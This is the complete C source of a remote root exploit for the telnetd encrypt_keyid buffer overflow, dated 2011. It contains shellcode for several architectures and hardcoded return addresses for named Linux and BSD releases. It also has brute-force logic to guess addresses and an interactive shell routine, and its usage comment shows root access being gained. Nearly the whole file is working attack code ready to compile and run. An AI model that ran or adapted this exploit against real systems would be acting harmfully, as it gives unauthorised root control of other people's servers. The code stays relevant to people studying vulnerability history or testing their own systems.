/***************************************************************************
 *            telnetd-encrypt_keyid.c
 *
 *  Mon Dec 26 20:37:05 CET 2011
 *
 *  Copyright  2011  Jaime Penalba Estebanez (NighterMan)
 *  Copyright  2011  Gonzalo J. Carracedo (BatchDrake)
 *
 *  nighterman@painsec.com - jpenalbae@gmail.com
 *  BatchDrake@painsec.com - BatchDrake@gmail.com
 *
 *            ______      __      ________
 *          /  __  /     /_/     /  _____/
 *         /  /_/ /______________\  \_____________
 *        /  ___ / __  / / __  /  \  \/ _ \/  __/
 *       /  /   / /_/ / / / / /___/  /  __/  /__
 *  ____/__/____\__,_/_/_/ /_/______/\___/\____/____
 *
 *
 ****************************************************************************/

/*
 *
 * Usage:
 *
 * $ gcc exploit.c -o exploit
 *
 * $ ./exploit 127.0.0.1 23 1
 * [<] Succes reading intial server request 3 bytes
 * [>] Telnet initial encryption mode and IV sent
 * [<] Server response: 8 bytes read
 * [>] First payload to overwrite function pointer sent
 * [<] Server response: 6 bytes read
 * [>] Second payload to triger the function pointer
 * [*] got shell?
 * uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


/*
 * Most of the inetd impletantions have a connection limit per second
 * so you must chage this if you start getting errors reading responses
 *  - for 60 conex per min  900000
 *  - for 40 conex per min 1500000
 *  - for no limit 300000 should work
 */
#define BRUTE_TOUT 300000



#define MAXKEYLEN 64-1

struct key_info
{
  unsigned char keyid[MAXKEYLEN];
  unsigned char keylen[4];
  unsigned char dir[4];
  unsigned char modep[4];
  unsigned char getcrypt[4];
};

struct target_profile
{
  uint32_t      skip;
  const char    *address;
  const char    *desc;
  const char    *shellcode;

};


/* Shellcode FreeBSD x86 */
const char s_bsd32[] =
   "\x31\xc0"                      // xor          %eax,%eax
   "\x50"                          // push         %eax
   "\xb0\x17"                      // mov          $0x17,%al
   "\x50"                          // push         %eax
   "\xcd\x80"                      // int          $0x80
   "\x50"                          // push         %eax
   "\x68\x6e\x2f\x73\x68"          // push         $0x68732f6e
   "\x68\x2f\x2f\x62\x69"          // push         $0x69622f2f
   "\x89\xe3"                      // mov          %esp,%ebx
   "\x50"                          // push         %eax
   "\x54"                          // push         %esp
   "\x53"                          // push         %ebx
   "\x50"                          // push         %eax
   "\xb0\x3b"                      // mov          $0x3b,%al
   "\xcd\x80";                     // int          $0x80

/* Shellcode Linux x86 */
const char s_linux32[] = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";


/* Shellcode Linux sparc */
const char s_linuxsparc[] = "\x2d\x0b\xd8\x9a"  /* sethi %hi(0x2f626800), %l6 */
                            "\xac\x15\xa1\x6e"  /* or %l6, 0x16e, %l6         */
                            "\x2f\x0b\xdc\xda"  /* sethi %hi(0x2f736800), %l7 */
                            "\x90\x0b\x80\x0e"  /* and %sp, %sp, %o0          */
                            "\x92\x03\xa0\x08"  /* add %sp, 0x08, %o1         */
                            "\x94\x22\x80\x0a"  /* sub %o2, %o2, %o2          */
                            "\x9c\x03\xa0\x10"  /* add %sp, 0x10, %sp         */
                            "\xec\x3b\xbf\xf0"  /* std %l6, [ %sp + - 16 ]    */
                            "\xd0\x23\xbf\xf8"  /* st %o0, [ %sp + - 8 ]      */
                            "\xc0\x23\xbf\xfc"  /* clr [ %sp + -4 ]           */
                            "\x82\x10\x20\x3b"  /* mov 0x3b, %g1              */
                            "\x91\xd0\x20\x10"; /* ta 0x10                    */



/* Valid targets list */
struct target_profile targets[] =
{
  {20, "\x00\x80\x05\x08", "Generic Linux i386 bruteforce", s_linux32},
  {20, "\x00\x80\x05\x08", "Generic BSD i386 bruteforce", s_bsd32},
  {20, "\x23\xcc\x05\x08", "Ubuntu GNU/Linux 10.04, Inetutils Server (i386)", s_linux32},
  {20, "\x12\xc9\x05\x08", "Ubuntu GNU/Linux 10.04, Heimdal Server (i386)", s_linux32},
  {20, "\xef\x56\x06\x08", "Debian GNU/Linux stable 6.0.3, Inetutils Server (i386)", s_linux32},
  {20, "\x56\x9a\x05\x08", "Debian GNU/Linux stable 6.0.3, Heimdal Server (i386)", s_linux32},
  {1,  "\x00\x03\xe7\x94", "Debian GNU/Linux stable 6.0.3 Inetutils (SPARC)", s_linuxsparc},
  {3,  "\x00\x03\x2e\x0c", "Debian GNU/Linux stable 6.0.3 Heimdal Server (SPARC)", s_linuxsparc},
  {20, "\xa6\xee\x05\x08", "FreeBSD 8.0 (i386)", s_bsd32},
  {20, "\xa6\xee\x05\x08", "FreeBSD 8.1 (i386)", s_bsd32},
  {20, "\xed\xee\x05\x08", "FreeBSD 8.2 (i386)", s_bsd32},
  {20, "\x02\xac\x05\x08", "NetBSD 5.1 (i386)", s_bsd32},

  {0, NULL, NULL, NULL}
};



/* Telnet commands */
static unsigned char tnet_init_enc[] =
        "\xff\xfa\x26\x00\x01\x01\x12\x13"
        "\x14\x15\x16\x17\x18\x19\xff\xf0";

static unsigned char tnet_option_enc_keyid[] = "\xff\xfa\x26\x07";

static unsigned char tnet_end_suboption[] = "\xff\xf0";


/* Check if the shellcode worked, slightly simpler than shell (int) */
static int
checkmagic (int fd)
{
  char got[32];

  if (write (fd, "echo pikachu\n", 13) < 0)
    return -1;

  if (read (fd, got, 32) <= 0)
    return -1;

  return -!strstr (got, "pikachu");
}


/*
 * shell(): semi-interactive shell hack
 */
static void shell(int fd)
{
    fd_set  fds;
    char    tmp[128];
    int n;

    /* check uid */
    write(fd, "id\n", 3);

    /* semi-interactive shell */
    for (;;) {
        FD_ZERO(&fds);
        FD_SET(fd, &fds);
        FD_SET(0, &fds);

        if (select(FD_SETSIZE, &fds, NULL, NULL, NULL) < 0) {
            perror("select");
            break;
        }

        /* read from fd and write to stdout */
        if (FD_ISSET(fd, &fds)) {
            if ((n = read(fd, tmp, sizeof(tmp))) < 0) {
                fprintf(stderr, "Goodbye...\n");
                break;
            }
            if (write(1, tmp, n) < 0) {
                perror("write");
                break;
            }
        }

        /* read from stdin and write to fd */
        if (FD_ISSET(0, &fds)) {
            if ((n = read(0, tmp, sizeof(tmp))) < 0) {
                perror("read");
                break;
            }
            if (write(fd, tmp, n) < 0) {
                perror("write");
                break;
            }
        }
    }
}


static int open_connection(in_addr_t dip, int dport)
{
   int pconn;
   struct sockaddr_in cdata;
   struct timeval timeout;

   /* timeout.tv_sec  = _opts.timeout; */
   timeout.tv_sec  = 8;
   timeout.tv_usec = 0;

   /* Set socket options and create it */
   cdata.sin_addr.s_addr = dip;
   cdata.sin_port = htons(dport);
   cdata.sin_family = AF_INET;

   pconn = socket(AF_INET, SOCK_STREAM, 0);

   if( pconn < 0 )
   {
      printf("Socket error: %i\n", pconn);
      printf("Err message: %s\n", strerror(errno));
      return (-1);
   }

   /* Set socket timeout */
   if ( setsockopt(pconn, SOL_SOCKET, SO_RCVTIMEO,
           (void *)&timeout, sizeof(struct timeval)) != 0)
      perror("setsockopt SO_RCVTIMEO: ");

   /* Set socket options */
   if ( setsockopt(pconn, SOL_SOCKET, SO_SNDTIMEO,
           (void *)&timeout, sizeof(struct timeval)) != 0)
      perror("setsockopt SO_SNDTIMEO: ");


   /* Make connection */
   if (connect(pconn,(struct sockaddr *) &cdata, sizeof(cdata)) != 0)
   {
      close(pconn);
      return -1;
   }

   return pconn;
}



static void usage(char *arg)
{
    int x = 0;

    printf("             ______      __      ________  \n");
    printf("           /  __  /     /_/     /  _____/\n");
    printf("          /  /_/ /______________\\  \\_____________\n");
    printf("         /  ___ / __  / / __  /  \\  \\/ _ \\/  __/\n");
    printf("        /  /   / /_/ / / / / /___/  /  __/  /__\n");
    printf("   ____/__/____\\__,_/_/_/ /_/______/\\___/\\____/____\n");
    printf("   ---------------- www.painsec.com ---------------\n\n");
    printf("(c) NighterMan & BatchDrake 2011, almost 2012\n");
    printf("OH MY GOD WE ARE ALL ABOUT TO DIE\n\n");
    printf("Available Targets:\n\n");


    /* print tagets */
    while(targets[x].address != NULL) {
        printf("  %2i: %s\n", x + 1, targets[x].desc);
        x++;
    }

    printf("\n");
    printf("Telnetd encrypt_keyid exploit\n");
    printf("Usage: %s [ip] [port] [target]\n\n", arg);
}


int
attack (const char *ip, unsigned int port,
        unsigned char *payload, unsigned int psize, int tryshell)
{
  unsigned char readbuf[256];
  int ret;
  int conn;

  /* Open the connection */
  conn = open_connection(inet_addr(ip), port);
  if (conn == -1) {
      printf("Error connecting: %i\n", errno);
      return -1;
  }

  /* Read initial server request */
  ret = read(conn, readbuf, 256);

  if (ret <= 0)
  {
    printf ("[!] Error receiving response: %s\n",
      ret ? strerror (errno) : "empty response");
    close (conn);
    return -1;
  }

  printf("[<] Succes reading intial server request %i bytes\n", ret);

  /* printf("ATTACH DEBUGGER & PRESS KEY TO CONITNUE\n"); */
  /* ret = getchar(); */

  /* Send encryption and IV */
  ret = write(conn, tnet_init_enc, sizeof(tnet_init_enc));
  if (ret != sizeof(tnet_init_enc)) {
      printf("Error sending init encryption: %i\n", ret);
      close (conn);
      return -1;
  }
  printf("[>] Telnet initial encryption mode and IV sent\n");

  /* Read response */
  if ((ret = read(conn, readbuf, 256)) == -1 && errno == EAGAIN)
  {
    printf ("[!] Timeout when receiving response\n");
    close (conn);
    return -1;
  }
  else
    printf("[<] Server response: %i bytes read\n", ret);

  /* Send the first payload with the overflow */
  ret = write(conn, payload, psize);
  if (ret != psize) {
      printf("Error sending payload first time\n");
      close (conn);
      return -1;
  }
  printf("[>] First payload to overwrite function pointer sent\n");

  /* Read Response */
  if ((ret = read(conn, readbuf, 256)) == -1 && errno == EAGAIN)
  {
    printf ("[!] Timeout when receiving response\n");
    close (conn);
    return -1;
  }
  else
    printf("[<] Server response: %i bytes read\n", ret);


  /* Send the payload again to tigger the function overwrite */
  ret = write(conn, payload, psize);
  if (ret != psize) {
      printf("Error sending payload second time\n");
      close (conn);
      return -1;
  }
  printf("[>] Second payload to triger the function pointer\n");

  if (tryshell)
  {
  /* Start the semi interactive shell */
    printf("[*] got shell?\n");
    shell(conn);

    ret = 0;
  }
  else
  {
    printf ("[*] Does this work? ");

    /* Just check if it works */

    if (checkmagic (conn) == 0)
    {
      printf ("YES!!!\n");
      printf ("Add the Target address to the targets list & recomple!!!\n");
      ret = 0;
    }
    else
    {
      printf ("nope :(\n");
      ret = -1;
    }
  }

  close (conn);

  return ret;
}


int main(int argc, char *argv[])
{
    int offset = 0;
    int target;
    int i;
    unsigned int address;

    /* Payload Size */
    int psize = (sizeof(struct key_info) +
                sizeof(tnet_option_enc_keyid) +
                sizeof(tnet_end_suboption));

    struct key_info bad_struct;
    unsigned char payload[psize];

    if ( argc != 4) {
        usage(argv[0]);
        return -1;
    }

    /* Fill the structure */
    memset(&bad_struct, 0x90, sizeof(struct key_info));
    memcpy(bad_struct.keylen,   "DEAD", 4);
    memcpy(bad_struct.dir,      "BEEF", 4);

    target = atoi(argv[3]) - 1;
    /* Target selection */
    struct target_profile *t;
    t = &targets[target];
    printf("Target: %s\n\n", t->desc);

    for (i = 0; !i || target < 2; i++)
    {
      offset = 0;
      memcpy(&bad_struct.keyid[t->skip], t->shellcode, strlen(t->shellcode));
      memcpy (&address, t->address, 4);

      address += ((i + 1) >> 1) * (t->skip - 1) * (1 - ((i & 1) << 1));
      printf ("[*] Target address: 0x%04x\n", address);

      memcpy(bad_struct.modep, &address, 4); /* Readable address */
      memcpy(bad_struct.getcrypt, &address, 4); /* Function pointer */

      /* Prepare the payload with the overflow */
      memcpy(payload, tnet_option_enc_keyid, sizeof(tnet_option_enc_keyid));
      offset += sizeof(tnet_option_enc_keyid);
      memcpy(&payload[offset], &bad_struct, sizeof(bad_struct));
      offset += sizeof(bad_struct);
      memcpy(&payload[offset], tnet_end_suboption, sizeof(tnet_end_suboption));

      if (attack (argv[1], atoi (argv[2]), payload, psize, target >= 2) == 0)
        break;

      usleep (BRUTE_TOUT);
    }

    return 0;
}